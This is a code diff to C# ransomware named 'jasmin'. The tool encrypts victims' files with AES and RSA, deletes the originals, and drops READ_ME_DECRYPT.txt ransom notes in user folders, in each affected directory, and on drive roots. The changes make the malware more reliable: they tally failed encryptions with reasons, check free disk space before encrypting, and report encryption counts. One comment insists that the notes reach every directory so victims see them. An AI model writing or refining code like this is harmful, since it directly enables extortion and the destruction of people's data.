@@ -48,6 +48,18 @@ static byte[] AesEnc(byte[] data,byte[] key,byte[] iv){
 static byte[] RsaEnc(byte[] data){
   using(var rsa=RSA.Create()){rsa.ImportFromPem(PUB);return rsa.Encrypt(data,RSAEncryptionPadding.OaepSHA256);}}
 
+static System.Collections.Generic.Dictionary<string,int> FAILS=new System.Collections.Generic.Dictionary<string,int>();
+static void NoteFail(string why){lock(FAILS){int v;FAILS.TryGetValue(why,out v);FAILS[why]=v+1;}}
+static void ReportFails(){
+  if(FAILS.Count==0)return;
+  try{
+    int tot=0;foreach(var kv in FAILS)tot+=kv.Value;
+    Console.Error.WriteLine("[jasmin] !!! 有 "+tot+" 处操作失败，原因统计:");
+    foreach(var kv in FAILS)Console.Error.WriteLine("[jasmin] !!!   "+kv.Value+" 次 — "+kv.Key);
+    Console.Error.WriteLine("[jasmin] !!! 自查: 磁盘剩余空间、分区是否只读/写保护、文件权限、路径长度");
+  }catch{}
+}
+
 static bool Enc(string path){
   try{
     if(Skip(path))return false;
@@ -63,7 +75,21 @@ static bool Enc(string path){
       fs.Write(BitConverter.GetBytes(ek.Length),0,4);}
     File.Delete(path);
     return true;
-  }catch{return false;}}
+  }catch(Exception ex){
+    string w;
+    if(ex is UnauthorizedAccessException)w="权限不足 (UnauthorizedAccessException) — 无法写入该目录";
+    else if(ex is PathTooLongException)w="路径过长 (PathTooLongException)";
+    else if(ex is System.IO.DirectoryNotFoundException)w="目录不存在 (DirectoryNotFoundException)";
+    else if(ex is System.IO.IOException){
+      string m=ex.Message;
+      if(m.IndexOf("space",StringComparison.OrdinalIgnoreCase)>=0||m.IndexOf("磁盘空间")>=0)
+        w="磁盘空间不足 (IOException) — 加密需为每个文件额外生成等大的 .jasmin，需要与被加密数据等量的空闲空间";
+      else w="IO错误 (IOException): "+m;
+    }
+    else w=ex.GetType().Name+": "+ex.Message;
+    NoteFail(w);
+    return false;
+  }}
 
 // ── 进度条 ──
 static long P_DONE=0, P_BYTES=0, P_OK=0;
@@ -151,12 +177,12 @@ static void DropNotes(){
     Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
     Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)};
   foreach(string d in dirs){
-    try{if(Directory.Exists(d)){File.WriteAllText(Path.Combine(d,"READ_ME_DECRYPT.txt"),txt);wrote++;}}catch{}}
+    try{if(Directory.Exists(d)){File.WriteAllText(Path.Combine(d,"READ_ME_DECRYPT.txt"),txt);wrote++;}}catch(Exception ex){NoteFail("勒索信投放失败(磁盘满/只读/权限): "+ex.GetType().Name);}}
   // 被加密文件所在的每个目录 —— 勒索信必须全部覆盖（原实现只投根目录，用户看不到）
   foreach(string d in NOTE_DIRS){
-    try{if(!string.IsNullOrEmpty(d)&&Directory.Exists(d)){File.WriteAllText(Path.Combine(d,"READ_ME_DECRYPT.txt"),txt);wrote++;}}catch{}}
+    try{if(!string.IsNullOrEmpty(d)&&Directory.Exists(d)){File.WriteAllText(Path.Combine(d,"READ_ME_DECRYPT.txt"),txt);wrote++;}}catch(Exception ex){NoteFail("勒索信投放失败(磁盘满/只读/权限): "+ex.GetType().Name);}}
   foreach(DriveInfo dr in DriveInfo.GetDrives()){
-    try{File.WriteAllText(dr.Name+"READ_ME_DECRYPT.txt",txt);wrote++;}catch{}}
+    try{File.WriteAllText(dr.Name+"READ_ME_DECRYPT.txt",txt);wrote++;}catch(Exception ex){NoteFail("勒索信投放失败(盘符根/只读): "+ex.GetType().Name);}}
   if(P_CONSOLE){try{Console.Error.WriteLine("[jasmin] 勒索信已投放 "+wrote+" 处");}catch{}}
 }
 
@@ -172,12 +198,27 @@ static void ScanTargets(){
       }}catch{}}}catch{}}
 }
 
+static void Preflight(){
+  try{
+    foreach(var dr in DriveInfo.GetDrives()){
+      try{
+        if(!dr.IsReady)continue;
+        long need=P_TOTAL_BYTES;
+        if(need>0&&dr.AvailableFreeSpace<need+need/20){
+          if(P_CONSOLE)Console.Error.WriteLine("[jasmin] !!! 空间预检警告: "+dr.Name+" 可用 "+FmtB(dr.AvailableFreeSpace)+" < 需要约 "+FmtB(need)+"（加密需为每个文件额外生成等大的 .jasmin，空间不足会大面积失败）");
+        }
+      }catch{}
+    }
+  }catch{}
+}
+
 static void Main(){
   try{var mc=new ManagementClass("Win32_LogicalDisk");
     foreach(ManagementObject o in mc.GetInstances())SID+=Convert.ToString(o["VolumeSerialNumber"]);}catch{}
 
   ScanTargets();
   if(P_CONSOLE){try{Console.Error.WriteLine("[jasmin] 发现 "+P_TOTAL+" 个目标文件，合计 "+FmtB(P_TOTAL_BYTES));}catch{}}
+  Preflight();
 
   long encCount=0,encSize=0;
   var encTypes=new System.Collections.Generic.HashSet<string>();
@@ -202,7 +243,8 @@ static void Main(){
         }));
       }}catch{}}}catch{}}
   System.Threading.Tasks.Task.WaitAll(tasks.ToArray());
-  if(P_CONSOLE){try{Console.Error.WriteLine();Console.Error.WriteLine("[jasmin] 加密完成: "+P_TOTAL+" 个文件, "+FmtB(P_TOTAL_BYTES));}catch{}}
+  if(P_CONSOLE){try{Console.Error.WriteLine();Console.Error.WriteLine("[jasmin] 加密完成: "+encCount+"/"+P_TOTAL+" 个文件, "+FmtB(encSize)+" / "+FmtB(P_TOTAL_BYTES));}catch{}}
+  ReportFails();
 
   DropNotes();
   // 构建detail JSON
